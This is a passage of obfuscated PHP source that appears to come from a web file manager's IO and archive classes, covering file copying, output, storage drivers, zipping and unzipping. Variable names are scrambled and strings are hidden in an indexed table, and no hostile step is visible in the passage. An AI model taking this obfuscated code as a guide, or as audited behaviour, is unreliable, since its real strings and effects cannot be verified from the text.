strlen($Â¬ÇÕæ¯)) == $Â¬ÇÕæ¯) { $“©•Úø½ = !0; } $Š²¸ªŸ£ = $î®ñû§ø->upload($–¸´°Ñë, $®ªé‡¢ê, $“©•Úø½); self::remove($’‹ÌÇã); Hook::trigger($¾ğ”£Ä[1220], $¦–¼œÉï, $ëú®£æœ, $î®ñû§ø, $–¸´°Ñë, $ğçîï», $Š²¸ªŸ£); self::copyMoveKeepInfo($¦–¼œÉï, $ëú®£æœ, $Š²¸ªŸ£); return $Š²¸ªŸ£; } private static function copyMoveKeepInfo($¦öƒ…„, $û·ºêÃè, $‡†€Êúè) { if (!$‡†€Êúè) { return; } $ê·´Ñ‰Û = $¦öƒ…„->info($û·ºêÃè); if (!is_array($ê·´Ñ‰Û)) { return; } IO::setModifyTime($‡†€Êúè, $ê·´Ñ‰Û[$_SERVER[‹è™Ü¸Ñ][88]]); } public static function pathFather($¨èûÅğÄ) { $šµÄéÃ = IO::init($¨èûÅğÄ); $Ş¶À®ƒ¾ = $šµÄéÃ->pathFather($šµÄéÃ->path); return $šµÄéÃ->getPathOuter($Ş¶À®ƒ¾); } public static function fileOut($„ÔÚ·‡ˆ, $ô—Û“Àí = false, $Ç×ªÊÜˆ = false, $È¤ÌÛ¥ = '') { $âÑÃÂóª = self::driverMake($„ÔÚ·‡ˆ); if ($âÑÃÂóª->isFileOutServer()) { return $âÑÃÂóª->fileOutServer($„ÔÚ·‡ˆ, $ô—Û“Àí, $Ç×ªÊÜˆ, $È¤ÌÛ¥); } return $âÑÃÂóª->fileOut($„ÔÚ·‡ˆ, $ô—Û“Àí, $Ç×ªÊÜˆ, $È¤ÌÛ¥); } public static function fileOutImage($Ğà¨ãã‰, $Ü¹Æ‹ˆÉ = 250) { $¸šÈÔÖì = array(250, 600, 1200, 2000, 3000, 5000); for ($–ª†ËÇÏ = 0; $–ª†ËÇÏ < count($¸šÈÔÖì); $–ª†ËÇÏ++) { if ($–ª†ËÇÏ == 0 && $Ü¹Æ‹ˆÉ <= $¸šÈÔÖì[$–ª†ËÇÏ]) { $Ü¹Æ‹ˆÉ = $¸šÈÔÖì[$–ª†ËÇÏ]; break; } else { if ($Ü¹Æ‹ˆÉ > $¸šÈÔÖì[$–ª†ËÇÏ - 1] && $Ü¹Æ‹ˆÉ <= $¸šÈÔÖì[$–ª†ËÇÏ]) { $Ü¹Æ‹ˆÉ = $¸šÈÔÖì[$–ª†ËÇÏ]; break; } else { if ($–ª†ËÇÏ == count($¸šÈÔÖì) - 1 && $Ü¹Æ‹ˆÉ > $¸šÈÔÖì[$–ª†ËÇÏ]) { $Ü¹Æ‹ˆÉ = $¸šÈÔÖì[$–ª†ËÇÏ]; break; } } } } $ˆú‘§Ï = self::driverMake($Ğà¨ãã‰); if ($ˆú‘§Ï->isFileOutServer()) { return $ˆú‘§Ï->fileOutImageServer($Ğà¨ãã‰, $Ü¹Æ‹ˆÉ); } return $ˆú‘§Ï->fileOutImage($Ğà¨ãã‰, $Ü¹Æ‹ˆÉ); } private static function driverIsSame($úÈôÙ§Œ, $÷äúÍ¨™) { $ã•‚ˆä =& $_SERVER[‹è™Ü¸Ñ]; $ƒÃùìç = $úÈôÙ§Œ->getType(); $º²¿ÊŒï = $÷äúÍ¨™->getType(); if ($ƒÃùìç != $º²¿ÊŒï) { return !1; } if ($ƒÃùìç == $ã•‚ˆä[812]) { return !0; } if ($ƒÃùìç == $ã•‚ˆä[109]) { return !0; } if ($úÈôÙ§Œ->pathDriver == $÷äúÍ¨™->pathDriver) { return !0; } return !1; } public static function copyUpdate($ìäòŒÙ, $‡½÷˜Ñ³) { $í¡Šì =& $_SERVER[‹è™Ü¸Ñ]; if (!IO::exist($ìäòŒÙ)) { return !1; } if (!IO::exist($‡½÷˜Ñ³)) { IO::mkdir($‡½÷˜Ñ³); } $ş¤£› = array_to_keyvalue(self::listAllSimple($ìäòŒÙ), $í¡Šì[87]); $»³’Ëî› = array_to_keyvalue(self::listAllSimple($‡½÷˜Ñ³), $í¡Šì[87]); $ê ™­‚ã = array(); $ç­•»Œƒ = array(); foreach ($ş¤£› as $¶“¦¹¥ò => $…­ñÎÌÖ) { if (isset($»³’Ëî›[$¶“¦¹¥ò])) { if ($…­ñÎÌÖ[$í¡Šì[78]] == 1) { continue; } if ($»³’Ëî›[$¶“¦¹¥ò][$í¡Šì[79]] == $…­ñÎÌÖ[$í¡Šì[79]]) { continue; } } if ($…­ñÎÌÖ[$í¡Šì[78]] == 1) { $ç­•»Œƒ[] = $‡½÷˜Ñ³ . $í¡Šì[8] . trim($¶“¦¹¥ò, $í¡Šì[8]); continue; } $ÒÃ©Í˜ = strstr(trim($¶“¦¹¥ò, $í¡Šì[8]), $í¡Šì[8]) ? get_path_father($¶“¦¹¥ò) : $í¡Šì[12]; $ê ™­‚ã[] = array($í¡Šì[1221] => $…­ñÎÌÖ[$í¡Šì[89]], $í¡Šì[1222] => rtrim($‡½÷˜Ñ³, $í¡Šì[8]) . $í¡Šì[8] . $ÒÃ©Í˜, $í¡Šì[1223] => $…­ñÎÌÖ); } $Ã¹äŒ¹‘ = array($í¡Šì[230] => $ê ™­‚ã, $í¡Šì[78] => $ç­•»Œƒ); Hook::trigger($í¡Šì[1224], $ìäòŒÙ, $‡½÷˜Ñ³, $Ã¹äŒ¹‘); foreach ($ç­•»Œƒ as $…­ñÎÌÖ) { IO::mkdir($…­ñÎÌÖ); } foreach ($ê ™­‚ã as $…­ñÎÌÖ) { IO::copy($…­ñÎÌÖ[$í¡Šì[1221]], $…­ñÎÌÖ[$í¡Šì[1222]], REPEAT_REPLACE); } } public static function fileSubstr($°˜†“ÖÜ, $ª–¦ ıÏ, $úÊğ¥—á = false) { $£…Û¤‡í =& $_SERVER[‹è™Ü¸Ñ]; $¸£ŸÎ¨Ò = self::driverMake($°˜†“ÖÜ); $ª÷¶õš = $¸£ŸÎ¨Ò->size($°˜†“ÖÜ); $×Ñ¢ ´Î = $ª–¦ ıÏ; $Í±ë»×® = $úÊğ¥—á; if ($ª–¦ ıÏ < 0) { $ª–¦ ıÏ = $ª÷¶õš + $ª–¦ ıÏ; } if ($úÊğ¥—á === !1) { $úÊğ¥—á = $ª÷¶õš - $ª–¦ ıÏ; } if ($ª–¦ ıÏ + $úÊğ¥—á > $ª÷¶õš) { $úÊğ¥—á = $ª÷¶õš - $ª–¦ ıÏ; } if (!$ª÷¶õš && $¸£ŸÎ¨Ò->getType() == $£…Û¤‡í[109] && !$¸£ŸÎ¨Ò->exist($°˜†“ÖÜ)) { $ã›Ìòö‹ = get_path_this($°˜†“ÖÜ); $ïı¸´à = parse_url_query($ã›Ìòö‹); if (is_array($ïı¸´à) && isset($ïı¸´à[$£…Û¤‡í[32]])) { $ã›Ìòö‹ = urldecode($ïı¸´à[$£…Û¤‡í[32]]); } throw new Exception($£…Û¤‡í[1225] . LNG($£…Û¤‡í[1226]) . $£…Û¤‡í[1024] . clear_html($ã›Ìòö‹) . $£…Û¤‡í[12]); } if ($úÊğ¥—á <= 0) { return $£…Û¤‡í[12]; } if ($ª–¦ ıÏ < 0 || $ª–¦ ıÏ >= $ª÷¶õš || $úÊğ¥—á > 1024 * 1024 * 10) { throw new Exception("\x66\x69\154\x65\122\145\141\x64\x20\x65\162\162\x6f\x72\x21\x20\163\x74\x61\x72\164\75{$ª–¦ ıÏ}\x3b\154\145\x6e\147\x74\x68\x3d{$úÊğ¥—á}\73\x20\163\151\172\x65\75{$ª÷¶õš}\73"); } $¦·¤³”§ = $¸£ŸÎ¨Ò->fileSubstr($°˜†“ÖÜ, $ª–¦ ıÏ, $úÊğ¥—á); if (!$¦·¤³”§ && $úÊğ¥—á && isset($GLOBALS[$£…Û¤‡í[1227]])) { throw new Exception($GLOBALS[$£…Û¤‡í[1227]][$£…Û¤‡í[1228]]); } return $¦·¤³”§; } private static function driverMake(&$šî’Ç§˜) { $‡öÒ±œÆ =& $_SERVER[‹è™Ü¸Ñ]; $±¤úüğœ = KodIO::parse($šî’Ç§˜); if (!self::$driverListSystem) { $ÔÀÚ»É = Model($‡öÒ±œÆ[822])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($ÔÀÚ»É, $‡öÒ±œÆ[475]); } if ($±¤úüğœ[$‡öÒ±œÆ[33]] == KodIO::KOD_IO && !self::$driverListSystem[$±¤úüğœ[$‡öÒ±œÆ[475]]]) { throw new Exception($‡öÒ±œÆ[1229]); return !1; } $šî’Ç§˜ = $±¤úüğœ[$‡öÒ±œÆ[1230]]; $õ½œ¯» = self::driverGet($±¤úüğœ, $šî’Ç§˜); return $õ½œ¯»; } private static function driverGet($àÉùÖ• , &$ı‡È§›©) { $á´Œª™ö =& $_SERVER[‹è™Ü¸Ñ]; $òÉ©›õÔ = $àÉùÖ• [$á´Œª™ö[1231]]; $ŞÉÎÓà = $àÉùÖ• [$á´Œª™ö[475]]; switch ($àÉùÖ• [$á´Œª™ö[33]]) { case KodIO::KOD_IO: $ß’ÌÑµç = self::$driverListSystem[$ŞÉÎÓà]; break; case KodIO::KOD_SOURCE: $ı‡È§›© = $ŞÉÎÓà . $ı‡È§›©; $ß’ÌÑµç = array($á´Œª™ö[1232] => $á´Œª™ö[1233], $á´Œª™ö[6] => $àÉùÖ• ); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $ı˜Û”í = $GLOBALS[$á´Œª™ö[1234]]; self::$driverListUser = array_to_keyvalue($ı˜Û”í, $á´Œª™ö[475]); } $ß’ÌÑµç = self::$driverListUser[$ŞÉÎÓà]; break; case KodIO::KOD_SHARE_LINK: $ß’ÌÑµç = array($á´Œª™ö[1232] => $á´Œª™ö[1235], $á´Œª™ö[6] => $àÉùÖ• ); $ÕÖÍ¢ã¸ = Action($á´Œª™ö[1236])->sharePathInfo($àÉùÖ• [$á´Œª™ö[87]]); $ı‡È§›© = $ÕÖÍ¢ã¸[$á´Œª™ö[193]]; if (!$ÕÖÍ¢ã¸[$á´Œª™ö[193]]) { $²Ç’¤›” = Model($á´Œª™ö[664])->getInfo($ÕÖÍ¢ã¸[$á´Œª™ö[665]]); $ı‡È§›© = KodIO::clear($²Ç’¤›”[$á´Œª™ö[1237]] . $àÉùÖ• [$á´Œª™ö[1230]]); $àÉùÖ• [$á´Œª™ö[560]] = $²Ç’¤›”; $àÉùÖ• [$á´Œª™ö[1212]] = $ı‡È§›©; $ß’ÌÑµç = array($á´Œª™ö[1232] => $á´Œª™ö[1238], $á´Œª™ö[6] => $àÉùÖ• ); } break; case KodIO::KOD_SHARE_ITEM: $ß’ÌÑµç = array($á´Œª™ö[1232] => $á´Œª™ö[1239], $á´Œª™ö[6] => $àÉùÖ• ); $²Ç’¤›” = Model($á´Œª™ö[664])->getInfo($àÉùÖ• [$á´Œª™ö[475]]); if ($²Ç’¤›”[$á´Œª™ö[193]] == $á´Œª™ö[228]) { $ı‡È§›© = KodIO::clear($²Ç’¤›”[$á´Œª™ö[1237]] . $àÉùÖ• [$á´Œª™ö[1230]]); $àÉùÖ• [$á´Œª™ö[560]] = $²Ç’¤›”; $àÉùÖ• [$á´Œª™ö[1212]] = $ı‡È§›©; $ß’ÌÑµç = array($á´Œª™ö[1232] => $á´Œª™ö[1240], $á´Œª™ö[6] => $àÉùÖ• ); } else { if (!$ı‡È§›©) { $ı‡È§›© = $²Ç’¤›”[$á´Œª™ö[193]]; } } break; default: $ı‡È§›© = $àÉùÖ• [$á´Œª™ö[87]]; $ß’ÌÑµç = array($á´Œª™ö[1232] => $á´Œª™ö[1241]); break; } $¥óğÓ¡ö = $àÉùÖ• [$á´Œª™ö[87]]; if (!isset(self::$driverCache[$¥óğÓ¡ö])) { $è«›‰«İ = strtolower($ß’ÌÑµç[$á´Œª™ö[98]]); $ÚÊ·®³œ = $GLOBALS[$á´Œª™ö[6]][$á´Œª™ö[92]][$á´Œª™ö[880]]; $¦‹£³²¶ = $á´Œª™ö[77] . (isset($ÚÊ·®³œ[$è«›‰«İ]) ? $ÚÊ·®³œ[$è«›‰«İ] : ucfirst($è«›‰«İ)); if (!class_exists($¦‹£³²¶)) { show_json("{$¦‹£³²¶}\x20\x6e\157\164\x20\145\x78\x69\163\x74\163\41", !1); } $Åî¸ÏÅ– = isset($ß’ÌÑµç[$á´Œª™ö[6]]) ? $ß’ÌÑµç[$á´Œª™ö[6]] : !1; self::$driverCache[$¥óğÓ¡ö] = new $¦‹£³²¶($Åî¸ÏÅ–); } $‡û¦ÀÕ° = self::$driverCache[$¥óğÓ¡ö]; $‡û¦ÀÕ°->pathDriver = $òÉ©›õÔ; $‡û¦ÀÕ°->pathBase = $á´Œª™ö[12]; if (isset($ß’ÌÑµç[$á´Œª™ö[6]][$á´Œª™ö[1242]])) { $‡û¦ÀÕ°->pathBase = rtrim($ß’ÌÑµç[$á´Œª™ö[6]][$á´Œª™ö[1242]], $á´Œª™ö[8]) . $á´Œª™ö[8]; $ı‡È§›© = $‡û¦ÀÕ°->pathBase . ltrim($ı‡È§›©, $á´Œª™ö[8]); } $ı‡È§›© = $‡û¦ÀÕ°->getPath($ı‡È§›©); if (isset($àÉùÖ• [$á´Œª™ö[1212]])) { $ı‡È§›© = $àÉùÖ• [$á´Œª™ö[1212]]; } $‡û¦ÀÕ°->path = $ı‡È§›©; return $‡û¦ÀÕ°; } public static function errorTips($à±÷¬ğü = false) { $ğ‰Ô¯ù™ =& $_SERVER[‹è™Ü¸Ñ]; static $“›‹€ = array(); $³¹Ïö†¨ = 1000; if ($à±÷¬ğü === -1) { return $“›‹€ ? $“›‹€[count($“›‹€) - 1] : $ğ‰Ô¯ù™[12]; } if ($à±÷¬ğü === !1) { return implode($ğ‰Ô¯ù™[262], $“›‹€); } if (count($“›‹€) >= $³¹Ïö†¨) { $“›‹€ = array_slice($“›‹€, $³¹Ïö†¨ * 0.5, $³¹Ïö†¨); } $“›‹€[] = $à±÷¬ğü; write_log($ğ‰Ô¯ù™[176] . ACTION . $ğ‰Ô¯ù™[1243] . $à±÷¬ğü, $ğ‰Ô¯ù™[1244]); } public static function getLastError($î„ÍÍî = '') { $²€ñ‹Å = self::errorTips(-1); return $²€ñ‹Å ? $²€ñ‹Å : $î„ÍÍî; } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $ïÜ²÷‚¥; if ($ïÜ²÷‚¥) { return $ïÜ²÷‚¥; } $á³¡ÚØ© = IO::init($_SERVER[‹è™Ü¸Ñ][8]); return $á³¡ÚØ©; } private static function iconvSystem($µÓ›Ñ·•) { return self::local()->iconvSystem($µÓ›Ñ·•); } private static function iconvApp($ªİÕŞ©î) { return self::local()->iconvApp($ªİÕŞ©î); } public static function zipFolder($â‘ÀÄØš, $´å‹©‚  = "\172\x69\x70", $İõĞßë = '', $§€á° = REPEAT_RENAME) { $™†²ã£ =& $_SERVER[‹è™Ü¸Ñ]; $©Ò“õû› = IO::listPath($â‘ÀÄØš); if (!$©Ò“õû›) { return !1; } $©Ò“õû› = array_merge($©Ò“õû›[$™†²ã£[85]], $©Ò“õû›[$™†²ã£[86]]); return self::zip($©Ò“õû›, $´å‹©‚ , $İõĞßë, $§€á°); } public static function zip($¹â†²õ, $å½‡­µ» = "\x7a\x69\x70", $ö—Ë´…ä = '', $ûßôŞ = REPEAT_RENAME) { $¬ Ãæú =& $_SERVER[‹è™Ü¸Ñ]; if (is_string($¹â†²õ) && $¹â†²õ) { $¹â†²õ = array(array($¬ Ãæú[87] => $¹â†²õ)); } $è»ÕæÌà = self::init($¹â†²õ[0][$¬ Ãæú[87]]); $’×öÀóà = self::info($¹â†²õ[0][$¬ Ãæú[87]]); $—Ì¬¢À¿ = $¬ Ãæú[12]; $Ø”¾‘åë = $¬ Ãæú[12]; $¸Ò‹ŠÂ£ = $¬ Ãæú[12]; if ($ö—Ë´…ä && substr($ö—Ë´…ä, -1, 1) != $¬ Ãæú[8]) { $Ø”¾‘åë = get_path_father($ö—Ë´…ä); $¸Ò‹ŠÂ£ = get_path_this($ö—Ë´…ä); } else { $Ø”¾‘åë = self::pathFather($’×öÀóà[$¬ Ãæú[87]]); $¸Ò‹ŠÂ£ = $’×öÀóà[$¬ Ãæú[32]] . $¬ Ãæú[10] . $å½‡­µ»; if (count($¹â†²õ) > 1) { $Ä»ä—”À = IO::info($Ø”¾‘åë); $¸Ò‹ŠÂ£ = $Ä»ä—”À[$¬ Ãæú[32]] . $¬ Ãæú[10] . $å½‡­µ»; } if ($ö—Ë´…ä) { $Ø”¾‘åë = $ö—Ë´…ä; } } if ($è»ÕæÌà->getType() == $¬ Ãæú[109]) { $§Íû”›‹ = self::init($Ø”¾‘åë); $ëˆŸÂ¼ì = $§Íû”›‹->getType() == $¬ Ãæú[109] ? $Ø”¾‘åë : get_path_father($è»ÕæÌà->path); $ëˆŸÂ¼ì = rtrim($ëˆŸÂ¼ì, $¬ Ãæú[8]) . $¬ Ãæú[8]; mk_dir($ëˆŸÂ¼ì); } else { $—Ì¬¢À¿ = TEMP_FILES . $¬ Ãæú[1245] . time() . rand_string(8) . $¬ Ãæú[8]; mk_dir($—Ì¬¢À¿); file_put_contents($—Ì¬¢À¿ . $¬ Ãæú[1246], $¬ Ãæú[12]); $ëˆŸÂ¼ì = $—Ì¬¢À¿; } $±Ÿ½ÑÎå = IO::info($ëˆŸÂ¼ì); if (!$±Ÿ½ÑÎå || !$±Ÿ½ÑÎå[$¬ Ãæú[233]]) { show_json(LNG($¬ Ãæú[1247]), !1); } $×ŸßÒç‰ = self::zipFileList($¹â†²õ, $—Ì¬¢À¿); foreach ($×ŸßÒç‰ as $‰Îš×Ñô => $·Ï¿®†Õ) { $×ŸßÒç‰[$‰Îš×Ñô] = self::iconvSystem($·Ï¿®†Õ); } $™Ì›»™¬ = get_filename_auto($ëˆŸÂ¼ì . $¸Ò‹ŠÂ£, $¬ Ãæú[12], $ûßôŞ); KodArchive::create(self::iconvSystem($™Ì›»™¬), $×ŸßÒç‰); if (!IO::exist($™Ì›»™¬)) { if ($—Ì¬¢À¿) { del_dir($—Ì¬¢À¿); } write_log($¬ Ãæú[1248] . $™Ì›»™¬, $¬ Ãæú[389]); show_json(LNG($¬ Ãæú[1249]), !1); } if (!$—Ì¬¢À¿) { return $™Ì›»™¬; } $ş¥êÍüˆ = self::move($™Ì›»™¬, $Ø”¾‘åë, $ûßôŞ); if ($—Ì¬¢À¿) { del_dir($—Ì¬¢À¿); } if (!$™Ì›»™¬) { write_log($¬ Ãæú[1250] . $™Ì›»™¬ . $¬ Ãæú[1251] . $Ø”¾‘åë, $¬ Ãæú[389]); show_json(LNG($¬ Ãæú[1249]), !1); } return $ş¥êÍüˆ; } public static function unzip($ÜóâÑ, $¾§ÌÚØÌ, $€‹Ï…¡å = "\x2d\61", $Ÿå¹è³‹ = "\x72\x65\x70\154\x61\143\145") { $à½û¼Äú =& $_SERVER[‹è™Ü¸Ñ]; $ÎŸ×½ôõ = parent::info($ÜóâÑ); if (!$ÎŸ×½ôõ) { show_json(LNG($à½û¼Äú[1252]), !1); } $Şóß”±ñ = IO::infoFullSimple($¾§ÌÚØÌ); if (!$Şóß”±ñ) { $¾§ÌÚØÌ = IO::mkdir($¾§ÌÚØÌ); } if (isset($Şóß”±ñ[$à½û¼Äú[193]]) && trim($Şóß”±ñ[$à½û¼Äú[87]], $à½û¼Äú[8]) != trim($¾§ÌÚØÌ, $à½û¼Äú[8])) { $ÒÊ«´¼ = KodIO::make($Şóß”±ñ[$à½û¼Äú[192]]); $²Î‹¨Ä = IO::fileNameAuto($ÒÊ«´¼, $Şóß”±ñ[$à½û¼Äú[32]], REPEAT_RENAME_FOLDER, !0); $¾§ÌÚØÌ = IO::mkdir($ÒÊ«´¼ . $²Î‹¨Ä); } $€‹Ï…¡å = $€‹Ï…¡å && $€‹Ï…¡å != $à½û¼Äú[1253] ? @json_decode($€‹Ï…¡å, !0) : -1; $Àâİ‹Ê = self::unzipPart($ÜóâÑ, $€‹Ï…¡å); if (!$Àâİ‹Ê || !IO::exist($Àâİ‹Ê[$à½û¼Äú[230]])) { show_json(LNG($à½û¼Äú[108]), !1); } $ùœƒÏï« = $Àâİ‹Ê[$à½û¼Äú[1254]][count($Àâİ‹Ê[$à½û¼Äú[1254]]) - 1]; if ($ùœƒÏï«[$à½û¼Äú[1255]] == -1 || substr($ùœƒÏï«[$à½û¼Äú[32]], -1, 1) == $à½û¼Äú[8]) { $Ÿ³ä«Ÿæ = $Àâİ‹Ê[$à½û¼Äú[1256]] . rand_string(10) . $à½û¼Äú[8]; mk_dir($Ÿ³ä«Ÿæ); $á‹µ™Ò§ = count($Àâİ‹Ê[$à½û¼Äú[1254]]) == 1 ? IO::ext($ÜóâÑ) : get_path_ext($Àâİ‹Ê[$à½û¼Äú[230]]); $‘áÂûñ = KodArchive::extract(self::iconvSystem($Àâİ‹Ê[$à½û¼Äú[230]]), $Ÿ³ä«Ÿæ, $ùœƒÏï«[$à½û¼Äú[1255]], $²Î‹¨Ä, $á‹µ™Ò§); self::unzipErrorCheck($‘áÂûñ, array($à½û¼Äú[1257], $ÜóâÑ, $á‹µ™Ò§, $¾§ÌÚØÌ, $Àâİ‹Ê)); Hook::trigger($à½û¼Äú[1258], $Ÿ³ä«Ÿæ); recursion_dir($Ÿ³ä«Ÿæ, $æ¶¼…ƒÊ, $¿Ã´õÎÀ, 0); $º›“šàÙ = array_merge($æ¶¼…ƒÊ, $¿Ã´õÎÀ); $––•ßå = array(); foreach ($º›“šàÙ as $½ã‰òƒ) { $½›éÜ = IO::move(self::iconvApp($½ã‰òƒ), $¾§ÌÚØÌ, $Ÿå¹è³‹); if ($½›éÜ) { $––•ßå[] = $½›éÜ; } } del_dir($Ÿ³ä«Ÿæ); } else { $½›éÜ = IO::move($Àâİ‹Ê[$à½û¼Äú[230]], $¾§ÌÚØÌ, $Ÿå¹è³‹, get_path_this($ùœƒÏï«[$à½û¼Äú[32]])); if ($½›éÜ) { $––•ßå[] = $½›éÜ; } } return $––•ßå ? $––•ßå : !1; } public static function unzipList($¾™´¡×ğ) { $ÕŠ£ä =& $_SERVER[‹è™Ü¸Ñ]; $Ã´Ş½¬ = isset($¾™´¡×ğ[$ÕŠ£ä[1259]]) ? $¾™´¡×ğ[$ÕŠ£ä[1259]] : !1; $–øÈöû = isset($¾™´¡×ğ[$ÕŠ£ä[1255]]) ? @json_decode($¾™´¡×ğ[$ÕŠ£ä[1255]], !0) : -1; $µ‘íˆ±¹ = self::unzipPart($¾™´¡×ğ[$ÕŠ£ä[87]], $–øÈöû); if (!$µ‘íˆ±¹ || !IO::exist($µ‘íˆ±¹[$ÕŠ£ä[230]])) { show_json(LNG($ÕŠ£ä[108]), !1); } $Ì×šç×Ó = $µ‘íˆ±¹[$ÕŠ£ä[1254]][count($µ‘íˆ±¹[$ÕŠ£ä[1254]]) - 1]; $Æˆ¦Öà = in_array(IO::ext($µ‘íˆ±¹[$ÕŠ£ä[230]]), array($ÕŠ£ä[389], $ÕŠ£ä[1260], $ÕŠ£ä[1261], $ÕŠ£ä[1262], $ÕŠ£ä[1263], $ÕŠ£ä[1264])); if (!$Ã´Ş½¬ && ($Ì×šç×Ó[$ÕŠ£ä[1255]] == -1 || $Æˆ¦Öà)) { $ÁËÙäò = $µ‘íˆ±¹[$ÕŠ£ä[1256]] . get_path_this($µ‘íˆ±¹[$ÕŠ£ä[230]]) . $ÕŠ£ä[1265]; if (!IO::exist($ÁËÙäò)) { $†å³©Ãî = $Ì×šç×Ó[$ÕŠ£ä[1255]] == -1 ? get_path_ext(IO::pathThis($¾™´¡×ğ[$ÕŠ£ä[87]])) : get_path_ext($µ‘íˆ±¹[$ÕŠ£ä[230]]); $ç©éØ = KodArchive::listContent(self::iconvSystem($µ‘íˆ±¹[$ÕŠ£ä[230]]), !0, $†å³©Ãî); self::unzipErrorCheck($ç©éØ, array($ÕŠ£ä[1266], $¾™´¡×ğ, $µ‘íˆ±¹)); @file_put_contents($ÁËÙäò, json_encode($ç©éØ[$ÕŠ£ä[1267]])); } return @json_decode(IO::getContent($ÁËÙäò), !0); } IO::fileOut($µ‘íˆ±¹[$ÕŠ£ä[230]], $Ã´Ş½¬, get_path_this($Ì×šç×Ó[$ÕŠ£ä[32]])); die; } private static function zipFileList($„Ï”Ï, $ÖƒÏ„Â… = false) { $æÓ·¥Å =& $_SERVER[‹è™Ü¸Ñ]; $¦Ö­¾šğ = array(); foreach ($„Ï”Ï as $¶ÂŒÚµã) { $¤ƒ³­æ’ = $¶ÂŒÚµã[$æÓ·¥Å[87]]; if ($ÖƒÏ„Â…) { $¤ƒ³­æ’ = self::copy($¶ÂŒÚµã[$æÓ·¥Å[87]], $ÖƒÏ„Â…, $æÓ·¥Å[873]); } else { $˜ËûØ¢İ = self::init($¶ÂŒÚµã[$æÓ·¥Å[87]]); if ($˜ËûØ¢İ->getType() == $æÓ·¥Å[109]) { $¤ƒ³­æ’ = $˜ËûØ¢İ->path; } } if ($¤ƒ³­æ’ && self::local()->exist($¤ƒ³­æ’)) { $¦Ö­¾šğ[$¶ÂŒÚµã[$æÓ·¥Å[87]]] = $¤ƒ³­æ’; } } if (!empty($¦Ö­¾šğ)) { return array_values($¦Ö­¾šğ); } show_json(LNG($æÓ·¥Å[1226]), !1); } private static function localFilePath($ŸĞîÉ¿Ë) { $Æ…–ç±Ç =& $_SERVER[‹è™Ü¸Ñ]; $–æÚ† º = KodIO::parse($ŸĞîÉ¿Ë); if ($–æÚ† º[$Æ…–ç±Ç[33]] == KodIO::KOD_SOURCE) { $¾Ÿ„Äı† = Model($Æ…–ç±Ç[879])->fileInfoGet(KodIO::sourceID($ŸĞîÉ¿Ë)); if (!$¾Ÿ„Äı†[$Æ…–ç±Ç[87]]) { show_json($Æ…–ç±Ç[1268], !1); } $ŸĞîÉ¿Ë = $¾Ÿ„Äı†[$Æ…–ç±Ç[87]]; } $…€¹¢™ = self::init($ŸĞîÉ¿Ë); if ($…€¹¢™->pathParse[$Æ…–ç±Ç[1212]]) { $ŸĞîÉ¿Ë = $…€¹¢™->pathParse[$Æ…–ç±Ç[1212]]; $…€¹¢™ = self::init($ŸĞîÉ¿Ë); } $ğÜÇ·Ôƒ = $…€¹¢™->getType(); if ($ğÜÇ·Ôƒ == $Æ…–ç±Ç[109] || $ğÜÇ·Ôƒ == $Æ…–ç±Ç[1269]) { if (!$…€¹¢™->exist($…€¹¢™->path)) { show_json(LNG($Æ…–ç±Ç[108]), !1); } return $…€¹¢™->path; } return !1; } public static function unzipPart($¢ªÜãÌŸ, $Á§øæç¹ = -1) { $ù·©¨ú‹ =& $_SERVER[‹è™Ü¸Ñ]; $¢ş–µõë = IO::pathThis($¢ªÜãÌŸ); if (!$Á§øæç¹ || $Á§øæç¹ == -1) { $¥•áñı¬ = array(array($ù·©¨ú‹[32] => $¢ş–µõë, $ù·©¨ú‹[1255] => -1)); $¥•áñı¬[0][$ù·©¨ú‹[1270]] = $¥•áñı¬[0][$ù·©¨ú‹[32]]; } else { if (is_array($Á§øæç¹)) { $¥•áñı¬ = $Á§øæç¹; $ôôğèÛ = count($¥•áñı¬) - 1; for ($ß³óø¶ = 0; $ß³óø¶ <= $ôôğèÛ; $ß³óø¶++) { $‘ÆæÛ£õ = $¥•áñı¬[$ß³óø¶]; $²á…îŸÒ = get_path_this($‘ÆæÛ£õ[$ù·©¨ú‹[32]]) . (checkExtSafe($‘ÆæÛ£õ[$ù·©¨ú‹[32]]) ? $ù·©¨ú‹[12] : $ù·©¨ú‹[1271]); $¥•áñı¬[$ß³óø¶][$ù·©¨ú‹[1270]] = $ù·©¨ú‹[1272] . intval($‘ÆæÛ£õ[$ù·©¨ú‹[1255]]) . $ù·©¨ú‹[462] . $²á…îŸÒ; if ($ß³óø¶ == 0) { continue; } $¥•áñı¬[$ß³óø¶][$ù·©¨ú‹[1270]] = $¥•áñı¬[$ß³óø¶ - 1][$ù·©¨ú‹[1270]] . $ù·©¨ú‹[1273] . $¥•áñı¬[$ß³óø¶][$ù·©¨ú‹[1270]]; } } } if (!is_array($¥•áñı¬) || count($¥•áñı¬) == 0) { return !1; } $²âì£…ô = $¥•áñı¬[count($¥•áñı¬) - 1]; if (!IO::exist($¢ªÜãÌŸ)) { return !1; } $ûö°‘Š£ = TEMP_FILES . $ù·©¨ú‹[1274] . kodIO::hashPathSafe($¢ªÜãÌŸ) . $ù·©¨ú‹[8]; $Íøœ°‹ = $ûö°‘Š£ . $²âì£…ô[$ù·©¨ú‹[1270]]; mk_dir($ûö°‘Š£); file_put_contents(TEMP_FILES . $ù·©¨ú‹[1246], $ù·©¨ú‹[12]); if (IO::exist($Íøœ°‹)) { return array($ù·©¨ú‹[230] => $Íøœ°‹, $ù·©¨ú‹[1254] => $¥•áñı¬, $ù·©¨ú‹[1256] => $ûö°‘Š£); } $š»åÅÆæ = self::localFilePath($¢ªÜãÌŸ); if (!$š»åÅÆæ) { $š»åÅÆæ = $ûö°‘Š£ . $ù·©¨ú‹[1275]; if (!IO::exist($š»åÅÆæ)) { self::copy($¢ªÜãÌŸ, $ûö°‘Š£, !1, get_path_this($š»åÅÆæ)); } } if (!$š»åÅÆæ || !IO::exist($š»åÅÆæ)) { return !1; } if ($²âì£…ô[$ù·©¨ú‹[1255]] == -1) { return array($ù·©¨ú‹[230] => $š»åÅÆæ, $ù·©¨ú‹[1254] => $¥•áñı¬, $ù·©¨ú‹[1256] => $ûö°‘Š£); } $øçÛ ¿Ò = $š»åÅÆæ; foreach ($¥•áñı¬ as $ß³óø¶ => $‘ÆæÛ£õ) { if (!$‘ÆæÛ£õ || $‘ÆæÛ£õ[$ù·©¨ú‹[1255]] == $ù·©¨ú‹[1253]) { break; } if (substr($‘ÆæÛ£õ[$ù·©¨ú‹[32]], -1, 1) == 